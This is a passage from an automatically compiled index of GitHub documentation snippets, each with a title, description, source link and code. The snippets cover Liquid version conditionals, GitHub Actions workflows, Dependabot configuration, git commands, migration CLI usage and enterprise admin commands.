not enabled\n```\n\n----------------------------------------\n\nTITLE: Nested Conditional with Else (Liquid)\nDESCRIPTION: This snippet shows nested Liquid conditionals with an `else` clause. It checks for fpt, ghes, ghae, or ghec. If true, it checks for fpt or ghec; if also true, and ghae is true, then 'Charlie'. If the second is not true, it renders 'Delta'\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/unnecessary.md#_snippet_4\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion fpt or ghes or ghae or ghec %}\nAlpha\n  {% ifversion fpt or ghec %}\n  Bravo\n    {% ifversion ghae %}\n    Charlie\n    {% endif %}\n  {% else %}\n  Delta\n  {% endif %}\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Configuring Dependabot for GitHub Actions Updates\nDESCRIPTION: This code snippet shows an example `dependabot.yml` file that configures Dependabot to check for updates to GitHub Actions dependencies. The `package-ecosystem` is set to `github-actions`, the `directory` is set to `/` to monitor workflow files, and the update `schedule` is set to `weekly`.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/keeping-your-actions-up-to-date-with-dependabot.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Set update schedule for GitHub Actions\n\nversion: 2\nupdates:\n\n  - package-ecosystem: \"github-actions\"\n    directory: \"/\"\n    schedule:\n      # Check for updates to GitHub Actions every week\n      interval: \"weekly\"\n```\n\n----------------------------------------\n\nTITLE: Finding Commits in Git History with Awk\nDESCRIPTION: This command uses git log to list commits in reverse order and awk to select every 1000th commit, allowing you to identify suitable commits for splitting a large push. The step size can be adjusted by modifying the `NR % 1000 == 0` condition. The result is a list of commit hashes to be used for individual pushes.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/troubleshooting-the-2-gb-push-limit.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngit log --oneline --reverse refs/heads/BRANCH-NAME | awk 'NR % 1000 == 0'\n```\n\n----------------------------------------\n\nTITLE: Example JSONP Link Header Output\nDESCRIPTION: This JSON snippet demonstrates how the `Link` header is represented in the JSONP callback output. The `Link` header is parsed into an array of `[url, options]` tuples, where `options` is an object containing the key-value pairs from the header.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/using-cors-and-jsonp-to-make-cross-origin-requests.md#_snippet_4\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"Link\": [\n    [\n      \"url1\",\n      {\n        \"rel\": \"next\"\n      }\n    ],\n    [\n      \"url2\",\n      {\n        \"rel\": \"foo\",\n        \"bar\": \"baz\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Conditional Note Display for GHES versions\nDESCRIPTION: This snippet conditionally displays a note if the GitHub Enterprise Server (GHES) version is greater than 3.13 and less than 3.16. It relies on the `ifversion` liquid tag and GHES version variables. The note indicates that delegated bypass for push protection is in public preview.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/secret-scanning/push-protection-delegate-bypass-beta-note.md#_snippet_0\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 3.13 and ghes < 3.16 %}\n\n>[!NOTE] Delegated bypass for push protection is currently in {% data variables.release-phases.public_preview %} and subject to change.\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Example: Setting and Using Environment Variable in PowerShell\nDESCRIPTION: This YAML configuration defines two steps to demonstrate setting and using an environment variable in PowerShell. The first step sets `action_state` to `yellow` by appending to `$env:GITHUB_ENV`. The second step reads and prints the value of `action_state` using `Write-Output`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_35\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Set the value\n    id: step_one\n    run: |\n      \"action_state=yellow\" >> $env:GITHUB_ENV\n  - name: Use the value\n    id: step_two\n    run: |\n      Write-Output \"$env:action_state\" # This will output 'yellow'\n\n```\n\n----------------------------------------\n\nTITLE: Forecasting GitHub Actions Usage\nDESCRIPTION: This bash script command forecasts potential GitHub Actions usage based on historical Bitbucket pipeline runs in a specified workspace. The `gh actions-importer` CLI is used. The `--workspace` flag specifies the Bitbucket workspace, and `--output-dir` defines the directory for the forecast report.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer forecast bitbucket --workspace :workspace --output-dir tmp/forecast_reports\n```\n\n----------------------------------------\n\nTITLE: Migrating a Single Repository (GHES 3.7- with AWS S3)\nDESCRIPTION: This snippet shows how to migrate a single repository using the `gh gei migrate-repo` command for GitHub Enterprise Server 3.7 or earlier using Amazon S3. It uses the `--aws-bucket-name` flag for authentication.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-github-enterprise-importer/migrating-between-github-products/migrating-repositories-from-github-enterprise-server-to-github-enterprise-cloud.md#_snippet_12\n\nLANGUAGE: Shell\nCODE:\n```\ngh gei migrate-repo --github-source-org SOURCE --source-repo CURRENT-NAME --github-target-org DESTINATION --target-repo NEW-NAME \\\n    --ghes-api-url GHES-API-URL --aws-bucket-name \"AWS-BUCKET-NAME\"\n```\n\n----------------------------------------\n\nTITLE: Triggering Workflow with merge_group Event in YAML\nDESCRIPTION: This YAML snippet configures a GitHub Actions workflow to trigger on both `pull_request` and `merge_group` events. This configuration is essential for workflows that interact with merge queues, ensuring checks are run when a pull request is added to the queue. The merge_group event is what triggers the status checks for the merge queue.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/collaborating-on-repositories-with-code-quality-features/troubleshooting-required-status-checks.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  pull_request:\n  merge_group:\n```\n\n----------------------------------------\n\nTITLE: Example Configuration Output\nDESCRIPTION: This shell script output shows an example of a successful configuration of the GitHub Actions Importer CLI, after providing the required credentials and URLs. It demonstrates the prompts presented to the user and the final confirmation message.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-bitbucket-pipelines-with-github-actions-importer.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\n$ gh actions-importer configure\n✔ Which CI providers are you configuring?: Bitbucket\nEnter the following values (leave empty to omit):\n✔ {% data variables.product.pat_generic_caps %} for GitHub: ***************\n✔ Base url of the GitHub instance: https://github.com\n✔ {% data variables.product.pat_generic_caps %} for Bitbucket: ********************\n✔ Base url of the Bitbucket instance: https://bitbucket.example.com\nEnvironment variables successfully updated.\n```\n\n----------------------------------------\n\nTITLE: Configuring Workflow to Trigger on Issue Open or Label\nDESCRIPTION: This snippet configures a GitHub Actions workflow to trigger when an issue is either opened or labeled.  It uses the `on` keyword to specify the `issues` event, and the `types` keyword to specify the `opened` and `labeled` activity types.  If both events occur simultaneously, multiple workflow runs will be triggered.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-activity-types.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\non:\n  issues:\n    types:\n      - opened\n      - labeled\n```\n\n----------------------------------------\n\nTITLE: Checkout REST API Description Branch (Shell)\nDESCRIPTION: Checks out a specific branch from the `github/rest-api-description` repository, usually the latest \"Update OpenAPI 3.1 Descriptions\" branch. This is done within a local clone of `github/docs-internal`. Replace `NAME-OF-REST-API-DESCRIPTION-BRANCH` with the appropriate branch name.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/lib/release-templates/release-steps-5.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\ncd rest-api-description\ngit checkout NAME-OF-REST-API-DESCRIPTION-BRANCH\n```\n\n----------------------------------------\n\nTITLE: Nested Conditional Rendering\nDESCRIPTION: This snippet showcases nested `ifversion` statements, where one `ifversion` condition is placed inside the `else` block of another.  It first checks if the GHES version is greater than 2.16. If false, it then checks if the GHES version is greater than 2.13 and renders different content accordingly.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/greater-than.md#_snippet_3\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes > 2.16 %}\n\nAlpha\n\n{% else %}\n\nBravo\n\n{% ifversion ghes > 2.13 %}\n\nCharlie\n\n{% endif %}\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: YAML Model File Example\nDESCRIPTION: This YAML snippet demonstrates the structure of a model file used to store CodeQL models for public methods. The file resides within the model pack directory and specifies which public methods in a given package are being modeled. Each package gets its own YAML file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-for-vs-code/using-the-advanced-functionality-of-the-codeql-for-vs-code-extension/using-the-codeql-model-editor.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n.github/codeql/extensions/sofa-jraft-java          # the model pack directory\n    models\n        com.alipay.sofa.jraft.option.model.yml # models public methods in package\n        com.alipay.sofa.jraft.rhea.options.model.yml\n```\n\n----------------------------------------\n\nTITLE: GitHub API Base URL for GitHub Enterprise Server\nDESCRIPTION: This code snippet illustrates the difference in base URLs between GitHub.com and GitHub Enterprise Server (GHES) when interacting with the GitHub API. The `HOSTNAME` variable represents the hostname of the GHES instance, which must be substituted with the actual hostname. The GHES URL includes `/api/v3`.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/making-your-github-app-available-for-github-enterprise-server.md#_snippet_0\n\nLANGUAGE: none\nCODE:\n```\n`https://api.github.com` | `https://HOSTNAME/api/v3`\n```\n\n----------------------------------------\n\nTITLE: Creating Kubernetes Secret for GitHub App Authentication\nDESCRIPTION: This snippet demonstrates how to create a Kubernetes secret to store GitHub App credentials (app ID, installation ID, and private key) for authentication with the GitHub API.  The created secret `pre-defined-secret` will be referenced in `values.yaml`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/deploying-runner-scale-sets-with-actions-runner-controller.md#_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nkubectl create secret generic pre-defined-secret \\\n  --namespace=arc-runners \\\n  --from-literal=github_app_id=123456 \\\n  --from-literal=github_app_installation_id=654321 \\\n  --from-file=github_app_private_key=private-key.pem\n```\n\n----------------------------------------\n\nTITLE: Rendering Markdown with Liquid\nDESCRIPTION: This code snippet demonstrates how to use the `renderContent` function to render a Markdown string containing Liquid syntax. It imports the `renderContent` function, passes a Markdown string with a Liquid variable `foo`, and a context object with `foo` set to 'bar'. The function returns a Promise that resolves to the rendered HTML.\nSOURCE: https://github.com/github/docs/blob/main/src/content-render/README.md#_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst renderContent = require('.')\n\nconst html = await renderContent(`\n# Beep\n{{ foo }}\n`, {\n  foo: 'bar'\n})\n```\n\n----------------------------------------\n\nTITLE: Linking to Specific Product Versions (Text)\nDESCRIPTION: Demonstrates how to create versioned links for {% data variables.product.prodname_ghe_server %} articles that link to different versions of {% data variables.product.prodname_docs %}. The example shows how to link from a {% data variables.product.prodname_ghe_server %} article to a Free, Pro, & Team version.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/setting-up-your-environment-to-work-on-github-docs/troubleshooting-your-environment.md#_snippet_5\n\nLANGUAGE: text\nCODE:\n```\n[{% raw %}{{ data variables.product.prodname_github_connect }} Addendum to the {{ data variables.product.prodname_enterprise }} License Agreement{% endraw %}](/free-pro-team@latest/articles/github-connect-addendum-to-the-github-enterprise-license-agreement/)\"\n```\n\n----------------------------------------\n\nTITLE: Test Case for Invalid Deposit Amounts in Python\nDESCRIPTION: This test case validates that the deposit method raises a ValueError when given a negative or zero amount. It utilizes assertRaises to check for the exception. Additionally, it verifies that the NotificationSystem is not called when an invalid deposit is attempted using assert_not_called().\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/writing-tests-with-github-copilot.md#_snippet_6\n\nLANGUAGE: python\nCODE:\n```\n    def test_deposit_negative_amount_raises_error(self):\n        account = BankAccount(initial_balance=100, notification_system=self.notification_system)\n        with self.assertRaises(ValueError):\n            account.deposit(0)\n        self.notification_system.notify.assert_not_called()\n```\n\n----------------------------------------\n\nTITLE: CodeQL CLI Pipeline Workflow Trigger\nDESCRIPTION: This workflow file triggers the automation of CodeQL CLI documentation generation. It's manually triggered approximately every two weeks by a member of the GitHub Docs team to align with releases of the CodeQL CLI. It accepts a branch input parameter that specifies the source files to pull from the semmle-code repo.\nSOURCE: https://github.com/github/docs/blob/main/src/codeql-cli/README.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\n.github/workflows/sync-codeql-cli.yml\n```\n\n----------------------------------------\n\nTITLE: Advanced Issue Filter: Nested with Parentheses\nDESCRIPTION: This example showcases how to use parentheses to create more complex, nested filters using boolean operators. It finds issues that are either of type \"Bug\" and assigned to @octocat, or of type \"Feature\" and assigned to @hubot. The parentheses group the conditions, allowing for more precise filtering logic.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/tracking-your-work-with-issues/using-issues/filtering-and-searching-issues-and-pull-requests.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\n(type:\"Bug\" AND assignee:octocat) OR (type:\"Feature\" AND assignee:hubot)\n```\n\n----------------------------------------\n\nTITLE: Creating Manifest Registration Form (Organization) - HTML\nDESCRIPTION: This HTML snippet creates a form that sends a POST request to GitHub to register a new GitHub App from a manifest for an organization account. It includes an input field for the manifest JSON and a submit button. Replace ORGANIZATION with the actual organization name.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/sharing-github-apps/registering-a-github-app-from-a-manifest.md#_snippet_2\n\nLANGUAGE: HTML\nCODE:\n```\n<form action=\"https://github.com/organizations/ORGANIZATION/settings/apps/new?state=abc123\" method=\"post\">\n register a GitHub App Manifest: <input type=\"text\" name=\"manifest\" id=\"manifest\"><br>\n <input type=\"submit\" value=\"Submit\">\n</form>\n```\n\n----------------------------------------\n\nTITLE: Define GitHub Actions Workflow\nDESCRIPTION: This YAML snippet defines a GitHub Actions workflow named 'learn-github-actions'. It triggers on push events, runs on an Ubuntu runner, checks out the code, sets up Node.js, installs bats, and executes a bats command.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/workflow-basic-example-and-explanation.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: learn-github-actions\nrun-name: {% raw %}${{ github.actor }}{% endraw %} is learning GitHub Actions\non: [push]\njobs:\n  check-bats-version:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '20'\n      - run: npm install -g bats\n      - run: bats -v\n```\n\n----------------------------------------\n\nTITLE: Configuring Jekyll Settings in _config.yml\nDESCRIPTION: This YAML snippet shows a sample `_config.yml` file for configuring Jekyll settings within a GitHub Pages site. It includes settings for LSI, safe mode, source directory, incremental builds, highlighter, Gist behavior, and Kramdown options for math engine and syntax highlighting. These settings control various aspects of Jekyll's build process and features.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/about-github-pages-and-jekyll.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nlsi: false\nsafe: true\nsource: [your repo's top level directory]\nincremental: false\nhighlighter: rouge\ngist:\n  noscript: false\nkramdown:\n  math_engine: mathjax\n  syntax_highlighter: rouge\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting: Could not rename config section\nDESCRIPTION: This snippet shows the error message when trying to rename a remote that doesn't exist. It also includes a snippet to view existing remotes using `git remote -v` command.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/git-basics/managing-remote-repositories.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\n$ git remote -v\n# View existing remotes\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (fetch)\n> origin  https://{% data variables.product.product_url %}/OWNER/REPOSITORY.git (push)\n```\n\n----------------------------------------\n\nTITLE: Auditing Migration Records with ghe-migrator\nDESCRIPTION: This command audits migration records using the `ghe-migrator audit` command, filtering by record type and state. It requires the Migration GUID. The -m flag filters by record type, and the -s flag filters by import state.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/migrating-data-to-github-enterprise-server.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\nghe-migrator audit -m RECORD_TYPE -s STATE -g MIGRATION-GUID\n```\n\n----------------------------------------\n\nTITLE: Nested ifversion with else condition\nDESCRIPTION: This snippet uses nested `ifversion` statements with an `else` condition. It checks if the GHES version is less than 2.14. If true, it renders 'Alpha' and then checks if `fpt` is true, rendering 'Bravo' if so. If the GHES version is not less than 2.14, it renders 'Charlie'.\nSOURCE: https://github.com/github/docs/blob/main/src/ghes-releases/tests/fixtures/remove-liquid-statements/less-than-next-oldest.md#_snippet_4\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghes < 2.14 %}\n\nAlpha\n\n{% ifversion fpt %}\n\nBravo\n\n{% endif %}\n\n{% else %}\n\nCharlie\n\n{% endif %}\n```\n\n----------------------------------------\n\nTITLE: Defining Banking Menu Display in Node.js\nDESCRIPTION: This function, `displayMenu()`, prints the available banking operations to the console, allowing the user to select an action.  It presents options such as viewing balance, crediting, debiting, and exiting.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nfunction displayMenu() {\n    console.log(\"1. View Balance\");\n    console.log(\"2. Credit Account\");\n    console.log(\"3. Debit Account\");\n    console.log(\"4. Exit\");\n}\n```\n\n----------------------------------------\n\nTITLE: Creating an error annotation in JavaScript\nDESCRIPTION: This snippet shows how to use the `core.error` function from the `@actions/core` toolkit to create an error annotation with a file name and line number. It requires the `@actions/core` dependency.  The `file` and `startLine` options specify where to highlight the error within the source code.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_2\n\nLANGUAGE: javascript\nCODE:\n```\ncore.error('Missing semicolon', {file: 'app.js', startLine: 1})\n```\n\n----------------------------------------\n\nTITLE: Linking to a Different Version - Liquid/Markdown\nDESCRIPTION: This snippet illustrates how to create a link to a different version of the same article within GitHub documentation. It uses Liquid templating to dynamically generate the link based on the `currentArticle` property, ensuring the link points to the corresponding page in the specified version.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/style-guide-and-content-model/style-guide.md#_snippet_18\n\nLANGUAGE: liquid/markdown\nCODE:\n```\n{% raw %}Organizations that use {% data variables.product.prodname_ghe_cloud %} can choose to allow publicly published sites, privately published sites, both, or neither. For more information, see [the {% data variables.product.prodname_ghe_cloud %} documentation](/enterprise-cloud@latest/{{ currentArticle }}).{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Including a License Overview in Jekyll (HTML)\nDESCRIPTION: This code snippet includes the `license-overview.html` file in a Jekyll website, passing the `license-id` as `agpl-3.0`. This allows for the dynamic inclusion of license information on the page, based on the provided identifier.  The surrounding context indicates that this is used on the Licenses page of the choosealicense.com website.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/learning-to-code/finding-and-understanding-example-code.md#_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n{% raw %}{% include license-overview.html license-id=\"agpl-3.0\" %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Example of minimizing inline links in Markdown\nDESCRIPTION: This example demonstrates how to reduce the number of inline links in a sentence to improve readability and translatability. Instead of embedding multiple links within a single sentence, the links are moved to the end, preceded by a clear introductory phrase, and utilize the AUTOTITLE tag where applicable.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/writing-content-to-be-translated.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\nRead [more about OAuth2.](/apps/building-integrations/setting-up-and-registering-oauth-apps/) Note that OAuth2 tokens can be [acquired programmatically](/rest/reference/oauth-authorizations/#create-a-new-authorization), for applications that are not websites.\n```\n\n----------------------------------------\n\nTITLE: Setting PAT environment variables in PowerShell\nDESCRIPTION: Sets the GH_PAT and GH_SOURCE_PAT environment variables using the `$env` command in PowerShell. The variables are used to store Personal Access Tokens for the destination and source organizations respectively. Replace TOKEN with the actual PAT values.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/env-variables-gei.md#_snippet_1\n\nLANGUAGE: PowerShell\nCODE:\n```\n$env:GH_PAT=\"TOKEN\"\n$env:GH_SOURCE_PAT=\"TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Update Commit Signing Service Settings - Bash\nDESCRIPTION: This snippet updates the configuration of the commit signing service using Consul Template to generate the Nomad job specification from a template file. It then runs the Nomad job to apply the configuration.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_site_admin_settings/update-commit-signing-service.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nsudo consul-template -once -template /etc/consul-templates/etc/nomad-jobs/gpgverify/gpgverify.hcl.ctmpl:/etc/nomad-jobs/gpgverify/gpgverify.hcl\n\nsudo nomad job run /etc/nomad-jobs/gpgverify/gpgverify.hcl\n```\n\n----------------------------------------\n\nTITLE: Continuing rebase with git\nDESCRIPTION: This snippet shows how to continue an interactive rebase using `git rebase --continue`. This requires a properly configured Git repository and being in the middle of an interactive rebase.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/working-with-secret-scanning-and-push-protection/working-with-push-protection-from-the-command-line.md#_snippet_8\n\nLANGUAGE: text\nCODE:\n```\ngit rebase --continue\n```\n\n----------------------------------------\n\nTITLE: GitHub Actions Syntax for Building with Node.js (YAML)\nDESCRIPTION: This YAML snippet demonstrates a GitHub Actions workflow for building a Node.js project. It checks out the code, sets up Node.js, installs dependencies, runs the build script, and executes tests.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-travis-ci-to-github-actions.md#_snippet_15\n\nLANGUAGE: yaml\nCODE:\n```\nname: Node.js CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Use Node.js\n        uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '16.x'\n      - run: npm install\n      - run: npm run build\n      - run: npm test\n```\n\n----------------------------------------\n\nTITLE: Open new issue using GitHub CLI\nDESCRIPTION: This workflow creates a new issue in the specified repository using the GitHub CLI. It requires `contents: read` and `issues: write` permissions. The `GH_TOKEN` environment variable is set using the `GITHUB_TOKEN` secret.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/github_token-input-example.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Open new issue\non: workflow_dispatch\n\njobs:\n  open-issue:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      issues: write\n    steps:\n      - run: |\n          gh issue --repo {% raw %}${{ github.repository }}{% endraw %} \\\n            create --title \"Issue title\" --body \"Issue body\"\n        env:\n          GH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Adding NVIDIA CUDA Feature to devcontainer.json\nDESCRIPTION: This snippet shows how to add the NVIDIA CUDA feature to the `.devcontainer/devcontainer.json` file. This is necessary for software that requires NVIDIA CUDA to utilize the codespace's GPU. The `installCudnn` option is set to `true` to also install the CUDA Deep Neural Network library.\nSOURCE: https://github.com/github/docs/blob/main/content/codespaces/developing-in-a-codespace/getting-started-with-github-codespaces-for-machine-learning.md#_snippet_0\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"features\": {\n    \"ghcr.io/devcontainers/features/nvidia-cuda:1\": {\n      \"installCudnn\": true\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Authenticating as root site administrator via API key with curl\nDESCRIPTION: Demonstrates how to authenticate as the root site administrator to access the Management Console API using the `api_key` parameter in a `curl` command. It requires replacing `HOSTNAME`, `ADMIN-PORT` and `YOUR_PASSWORD` with appropriate values. This method passes the password as an API key.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/management-console.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -L 'https://HOSTNAME:ADMIN-PORT/setup/api?api_key=YOUR_PASSWORD'\n```\n\n----------------------------------------\n\nTITLE: Fetching API V1 in JavaScript with hostname replacement\nDESCRIPTION: This JavaScript code snippet uses the `fetch` API to make a request to the `/api/v1` endpoint. The `HOSTNAME` placeholder will be dynamically replaced if the `replacedomain` annotation is present in the code fence, using the user's hostname from their cookie. It depends on the `fetch` API being available in the execution environment.\nSOURCE: https://github.com/github/docs/blob/main/src/fixtures/fixtures/content/get-started/markdown/replace-domain.md#_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nawait fetch(\"https://HOSTNAME/api/v1\")\n```\n\n----------------------------------------\n\nTITLE: Starting Datastore Replication with ghe-repl-start\nDESCRIPTION: This command initiates the replication of datastores. It's crucial to note that `ghe-repl-start` can cause a brief outage on the primary server, potentially leading to internal server errors for users. To minimize this impact, it's recommended to put the primary node into maintenance mode before running this command.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise_installation/replication-command.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nghe-repl-start\n```\n\n----------------------------------------\n\nTITLE: Customizing Theme CSS with SCSS in Jekyll\nDESCRIPTION: This snippet configures a SCSS file to import the default CSS from the Jekyll theme specified in the `_config.yml` file. It allows for adding custom CSS or Sass overrides and extensions after the import statement. The snippet relies on Jekyll's templating engine to insert the correct theme.\nSOURCE: https://github.com/github/docs/blob/main/content/pages/setting-up-a-github-pages-site-with-jekyll/adding-a-theme-to-your-github-pages-site-using-jekyll.md#_snippet_0\n\nLANGUAGE: SCSS\nCODE:\n```\n---\n---\n\n@import \"{% raw %}{{ site.theme }}{% endraw %}\";\n\n```\n\n----------------------------------------\n\nTITLE: SSH Key Addition Notification Email - Text\nDESCRIPTION: This code snippet shows the email notification a user receives when a new SSH key is added to their account. It includes the key's title and fingerprint and a link to remove the key if it was added in error.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-accounts-and-repositories/managing-users-in-your-enterprise/auditing-ssh-keys.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\nThe following SSH key was added to your account:\n\n[title]\ned:21:60:64:c0:dc:2b:16:0f:54:5f:2b:35:2a:94:91\n\nIf you believe this key was added in error, you can remove the key and disable access at the following location:\n\nhttp(s)://HOSTNAME/settings/ssh\n```\n\n----------------------------------------\n\nTITLE: Example: Setting and Getting Output Parameter in PowerShell\nDESCRIPTION: This YAML configuration demonstrates how to set the `SELECTED_COLOR` output parameter and retrieve it in a subsequent step. The color is set by appending to `$env:GITHUB_OUTPUT`, and accessed via `${{ steps.color-selector.outputs.SELECTED_COLOR }}`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_41\n\nLANGUAGE: yaml\nCODE:\n```\n      - name: Set color\n        id: color-selector\n        run: |\n            \"SELECTED_COLOR=green\" >> $env:GITHUB_OUTPUT\n      - name: Get color\n        env:{% raw %}\n          SELECTED_COLOR: ${{ steps.color-selector.outputs.SELECTED_COLOR }}{% endraw %}\n        run: Write-Output \"The selected color is $env:SELECTED_COLOR\"\n\n```\n\n----------------------------------------\n\nTITLE: Cache key using hash of package-lock.json\nDESCRIPTION: This YAML snippet shows how to create a cache key that includes the SHA-256 hash of an npm `package-lock.json` file. This ensures that a new cache is automatically created when the dependencies in the `package-lock.json` file change. The expression `hashFiles('package-lock.json')` calculates the hash, and the resulting key includes the prefix `npm-`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/caching-dependencies-to-speed-up-workflows.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\nnpm-${{ hashFiles('package-lock.json') }}\n```\n\n----------------------------------------\n\nTITLE: Conditional Rendering for GitHub Enterprise Cloud (GHEC)\nDESCRIPTION: This snippet conditionally renders text for organizations on {% data variables.product.prodname_team %} or {% data variables.product.prodname_ghe_cloud %} if {% data variables.product.prodname_GH_code_security %} is enabled. The {% ifversion ghec %} tag checks if the current version is GitHub Enterprise Cloud.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/gated-features/security-campaigns.md#_snippet_1\n\nLANGUAGE: Liquid\nCODE:\n```\n{% ifversion ghec %}\nOrganizations on {% data variables.product.prodname_team %} or {% data variables.product.prodname_ghe_cloud %} with [{% data variables.product.prodname_GH_code_security %}](/get-started/learning-about-github/about-github-advanced-security) enabled{% endif %}\n```\n\n----------------------------------------\n\nTITLE: GitLab CI/CD Caching Syntax\nDESCRIPTION: This YAML snippet shows an example of caching in GitLab CI/CD.  It defines an image, a cache configuration, and a `before_script` section. The `cache` section specifies the key and paths to cache. The `before_script` section installs dependencies using npm.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-gitlab-cicd-to-github-actions.md#_snippet_10\n\nLANGUAGE: yaml\nCODE:\n```\nimage: node:latest\n\ncache:\n  key: $CI_COMMIT_REF_SLUG\n  paths:\n    - .npm/\n\nbefore_script:\n  - npm ci --cache .npm --prefer-offline\n\ntest_async:\n  script:\n    - node ./specs/start.js ./specs/async.spec.js\n```\n\n----------------------------------------\n\nTITLE: Counting Language Byte Count\nDESCRIPTION: This Ruby snippet iterates through the languages for each repository, and counts up the bytes for each language. The counts are kept in the `language_obj` object. Each time the same language comes up in 